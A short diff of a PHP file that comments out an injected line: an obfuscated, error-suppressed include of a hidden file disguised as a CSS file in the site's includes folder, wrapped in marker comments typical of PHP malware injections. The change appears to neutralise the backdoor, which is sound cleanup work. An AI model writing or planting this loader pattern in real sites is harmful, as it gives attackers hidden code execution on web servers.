@@ -1,7 +1,7 @@
 <?php
 /*ed2b2*/
 
-$r4k = "/hom\x65/g\x65smuj\x65r/public_html/SYSGES/includ\x65s/.82778613.css"; if (isset($r4k)){ @include_once /* 6yzd */ ($r4k); }
+//$r4k = "/hom\x65/g\x65smuj\x65r/public_html/SYSGES/includ\x65s/.82778613.css"; if (isset($r4k)){ @include_once /* 6yzd */ ($r4k); }
 
 /*ed2b2*/
 session_start();
